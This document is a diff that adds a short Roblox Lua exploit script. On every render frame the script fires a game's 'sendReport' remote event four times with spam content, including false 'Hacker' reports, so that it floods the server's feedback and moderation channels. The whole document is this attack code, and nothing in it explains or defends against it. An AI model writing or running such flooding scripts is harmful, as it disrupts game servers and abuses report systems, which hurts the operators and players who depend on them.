@@ -1,0 +1,7 @@
+local spam = FLOOD
+game:GetService("RunService").RenderStepped:Connect(function()
+    game.ReplicatedStorage.Events.sendReport:FireServer(spam, "Feedback")
+    game.ReplicatedStorage.Events.sendReport:FireServer(spam, "Bug")
+    game.ReplicatedStorage.Events.sendReport:FireServer(spam, "Idea")
+    game.ReplicatedStorage.Events.sendReport:FireServer("", "Hacker", spam)
+end)
